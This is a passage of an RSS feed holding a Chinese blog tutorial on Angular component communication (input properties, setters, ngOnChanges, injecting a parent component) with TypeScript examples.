<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Angular开发实践（四）：组件之间的交互 - laixiangran</title>
<link>http://www.cnblogs.com/laixiangran/p/8639257.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/laixiangran/p/8639257.html</guid>
<description>&lt;p&gt;在Angular应用开发中，组件可以说是随处可见的。本篇文章将介绍几种常见的组件通讯场景，也就是让两个或多个组件之间交互的方法。&lt;/p&gt;
&lt;p&gt;根据数据的传递方向，分为&lt;strong&gt;父组件向子组件传递&lt;/strong&gt;、&lt;strong&gt;子组件向父组件传递&lt;/strong&gt;及&lt;strong&gt;通过服务传递&lt;/strong&gt;三种交互方法。&lt;/p&gt;
&lt;h2 id=&quot;父组件向子组件传递&quot;&gt;父组件向子组件传递&lt;/h2&gt;
&lt;p&gt;子组件通过&lt;a href=&quot;https://angular.cn/guide/template-syntax#inputs-outputs&quot;&gt;@Input装饰器&lt;/a&gt;定义&lt;strong&gt;输入属性&lt;/strong&gt;，然后父组件在引用子组件的时候通过这些输入属性向子组件传递数据，子组件可通过&lt;code&gt;setter&lt;/code&gt;或&lt;code&gt;ngOnChanges()&lt;/code&gt;来截听输入属性值的变化。&lt;/p&gt;
&lt;p&gt;先定义两个组件，分别为&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;和&lt;code&gt;父组件DemoParentComponent&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;子组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramOne}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramTwo}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() &lt;span class=&quot;dt&quot;&gt;paramOne&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性1&lt;/span&gt;
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() &lt;span class=&quot;dt&quot;&gt;paramTwo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性2&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;子组件通过&lt;code&gt;@Input()&lt;/code&gt;定义输入属性&lt;code&gt;paramOne&lt;/code&gt;和&lt;code&gt;paramTwo&lt;/code&gt;（属性值可以为任意数据类型）&lt;/p&gt;
&lt;p&gt;父组件：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-parent'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;demo-child [paramOne]='paramOneVal' [paramTwo]='paramTwoVal'&amp;gt;&amp;lt;/demo-child&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoParentComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'传递给paramOne的数据'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramTwoVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'传递给paramTwo的数据'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;父组件在其模板中通过选择器&lt;code&gt;demo-child&lt;/code&gt;引用&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;，并通过子组件的两个输入属性&lt;code&gt;paramOne&lt;/code&gt;和&lt;code&gt;paramTwo&lt;/code&gt;向子组件传递数据，最后在子组件的模板中就显示&lt;code&gt;传递给paramOne的数据&lt;/code&gt;和&lt;code&gt;传递给paramTwo的数据&lt;/code&gt;这两行文本。&lt;/p&gt;
&lt;h4 id=&quot;通过-setter-截听输入属性值的变化&quot;&gt;通过 setter 截听输入属性值的变化&lt;/h4&gt;
&lt;p&gt;在实际应用中，我们往往需要在某个输入属性值发生变化的时候做相应的操作，那么此时我们需要用到输入属性的 setter 来截听输入属性值的变化。&lt;/p&gt;
&lt;p&gt;我们将&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;进行如下改造：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramOneVal}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramTwo}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() 
    set &lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; (&lt;span class=&quot;dt&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性1&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; val&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;co&quot;&gt;// dosomething&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;};&lt;/span&gt;
    get &lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; () &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;};&lt;/span&gt;
    
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() &lt;span class=&quot;dt&quot;&gt;paramTwo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性2&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在上面的代码中，我们可以看到通过&lt;code&gt;paramOne&lt;/code&gt;属性的 setter 将拦截到的值&lt;code&gt;val&lt;/code&gt;赋值给内部私有属性&lt;code&gt;paramOneVal&lt;/code&gt;，达到父组件传递数据给子组件的效果。当然，最重要的是，在 setter 里面你可以做更多的其它操作，程序的灵活性就更强了。&lt;/p&gt;
&lt;h4 id=&quot;通过ngonchanges来截听输入属性值的变化&quot;&gt;通过ngOnChanges()来截听输入属性值的变化&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;通过 setter 截听输入属性值的变化&lt;/code&gt;的方法只能对单个属性值变化进行监视，如果需要监视多个、交互式输入属性的时候，这种方法就显得力不从心了。而通过使用 OnChanges 生命周期钩子接口的 ngOnChanges() 方法（当组件通过&lt;code&gt;@Input&lt;/code&gt;装饰器显式指定的那些变量的值变化时调用）就可以实现同时监视多个输入属性值的变化。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;子组件DemoChildComponent&lt;/code&gt;新增&lt;code&gt;ngOnChanges&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramOneVal}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramTwo}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;kw&quot;&gt;implements&lt;/span&gt; OnChanges &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() 
    set &lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; (&lt;span class=&quot;dt&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性1&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; val&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;co&quot;&gt;// dosomething&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;};&lt;/span&gt;
    get &lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; () &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;};&lt;/span&gt;
    
    @&lt;span class=&quot;at&quot;&gt;Input&lt;/span&gt;() &lt;span class=&quot;dt&quot;&gt;paramTwo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 输入属性2&lt;/span&gt;
    
    &lt;span class=&quot;at&quot;&gt;ngOnChanges&lt;/span&gt;(&lt;span class=&quot;dt&quot;&gt;changes&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;[&lt;span class=&quot;dt&quot;&gt;propKey&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; string]&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; SimpleChange&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;kw&quot;&gt;let&lt;/span&gt; propName &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; changes) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 遍历changes&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;let&lt;/span&gt; changedProp &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; changes[propName]&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// propName是输入属性的变量名称&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;let&lt;/span&gt; to &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;JSON&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;stringify&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;changedProp&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;currentValue&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 获取输入属性当前值&lt;/span&gt;
            &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;va&quot;&gt;changedProp&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;isFirstChange&lt;/span&gt;()) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 判断输入属性是否首次变化&lt;/span&gt;
                &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;`Initial value of &lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;${&lt;/span&gt;propName&lt;span class=&quot;sc&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt; set to &lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;${&lt;/span&gt;to&lt;span class=&quot;sc&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;cf&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;JSON&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;stringify&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;changedProp&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;previousValue&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 获取输入属性先前值&lt;/span&gt;
                &lt;span class=&quot;va&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;${&lt;/span&gt;propName&lt;span class=&quot;sc&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt; changed from &lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt; to &lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;${&lt;/span&gt;to&lt;span class=&quot;sc&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;)&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;新增的&lt;code&gt;ngOnChanges&lt;/code&gt;方法接收的参数&lt;code&gt;changes&lt;/code&gt;是以输入属性名称为键、值为&lt;code&gt;SimpleChange&lt;/code&gt;的对象，&lt;a href=&quot;https://angular.cn/api/core/SimpleChange&quot;&gt;SimpleChange&lt;/a&gt;对象含有当前输入属性是否第一次变化、先前值、当前值等属性。因此在&lt;code&gt;ngOnChanges&lt;/code&gt;方法中通过遍历&lt;code&gt;changes&lt;/code&gt;对象可监视多个输入属性值并进行相应的操作。&lt;/p&gt;
&lt;h4 id=&quot;获取父组件实例&quot;&gt;获取父组件实例&lt;/h4&gt;
&lt;p&gt;前面介绍的都是子组件通过&lt;code&gt;@Input装饰器&lt;/code&gt;定义输入属性，这样父组件可通过输入属性将数据传递给子组件。&lt;/p&gt;
&lt;p&gt;当然，我们可以想到一种更主动的方法，那就是获取到父组件实例，然后调用父组件的某个属性或方法来获取需要的数据。&lt;strong&gt;考虑到每个组件的实例都会添加到注入器的容器里，因此可通过&lt;a href=&quot;https://angular.cn/guide/dependency-injection&quot;&gt;依赖注入&lt;/a&gt;来找到父组件的示例&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;子组件获取父组件实例&lt;/code&gt;相比于&lt;code&gt;父组件获取子组件实例&lt;/code&gt;（直接通过&lt;code&gt;模板变量&lt;/code&gt;、&lt;code&gt;@ViewChild&lt;/code&gt;或&lt;code&gt;@ViewChildren&lt;/code&gt;获取）要麻烦一些。&lt;/p&gt;
&lt;p&gt;要在子组件中获取父组件的实例，有两种情况：&lt;/p&gt;
&lt;ul readability=&quot;5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;已知父组件的类型&lt;/p&gt;
&lt;p&gt;这种情况可以直接通过在构造函数中注入DemoParentComponent来获取已知类型的父组件引用，代码示例如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-child'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramOne}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;p&amp;gt;{{paramTwo}}&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoChildComponent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramOne&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramTwo&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;at&quot;&gt;constructor&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;demoParent&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; DemoParentComponent) &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;co&quot;&gt;// 通过父组件实例demoParent获取数据&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOne&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;demoParent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramTwo&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;demoParent&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;paramTwoVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li readability=&quot;18&quot;&gt;
&lt;p&gt;未知父组件的类型&lt;/p&gt;
&lt;p&gt;一个组件可能是多个组件的子组件，有时候无法直接知道父组件的类型，在Angular中，可通过&lt;code&gt;类—接口（Class-Interface）&lt;/code&gt;的方式来查找，即让父组件通过提供一个与&lt;code&gt;类—接口&lt;/code&gt;标识同名的别名来协助查找。&lt;/p&gt;
&lt;p&gt;首先创建DemoParent抽象类，它只声明了&lt;code&gt;paramOneVal&lt;/code&gt;和&lt;code&gt;paramTwoVal&lt;/code&gt;属性，没有实现（赋值），示例代码如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;im&quot;&gt;export&lt;/span&gt; abstract &lt;span class=&quot;kw&quot;&gt;class&lt;/span&gt; DemoParent &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramOneVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;dt&quot;&gt;paramTwoVal&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; any&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后在&lt;code&gt;父组件DemoParentComponent&lt;/code&gt;的&lt;code&gt;providers&lt;/code&gt;元数据中定义一个别名 Provider，用 useExisting 来注入父组件DemoParentComponent的实例，代码示例如下：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;@&lt;span class=&quot;at&quot;&gt;Component&lt;/span&gt;(&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;selector&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'demo-parent'&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;vs&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;    &amp;lt;demo-child [paramOne]='paramOneVal' [paramTwo]='paramTwoVal'&amp;gt;&amp;lt;/demo-child&amp;gt;&lt;/span&gt;
&lt;span class=&quot;vs&quot;&gt;  `&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;dt&quot;&gt;providers&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; [&lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; DemoParent&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;useExisting&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;:&lt;/span&gt; DemoParentComponent&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;]
&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;)
